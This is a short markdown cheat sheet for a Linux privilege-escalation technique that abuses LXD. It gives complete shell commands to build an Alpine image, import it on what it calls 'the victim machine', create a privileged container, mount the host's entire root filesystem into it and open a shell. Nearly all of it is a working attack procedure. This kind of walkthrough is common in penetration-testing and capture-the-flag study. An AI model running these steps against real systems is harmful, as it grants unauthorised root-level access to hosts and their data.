# build a simple alpine image

```bash
git clone https://github.com/saghul/lxd-alpine-builder
cd lxd-alpine-builder
sed -i 's,yaml_path="latest-stable/releases/$apk_arch/latest-releases.yaml",yaml_path="v3.8/releases/$apk_arch/latest-releases.yaml",' build-alpine
sudo ./build-alpine -a i686
```

# import the image

```bash
lxc image import ./alpine*.tar.gz --alias myimage # It's important doing this from YOUR HOME directory on the victim machine, or it might fail.
```

# lxc check
Before running the image, start and configure the lxd storage pool as default.
Check if init was successful maybe its needed to disable ipv6.

```bash
lxd init
```

# run the image

```bash
lxc init myimage mycontainer -c security.privileged=true
```

# mount the /root into the image

```bash
lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true
```

# interact with the container

```bash
lxc start mycontainer
lxc exec mycontainer /bin/sh
```

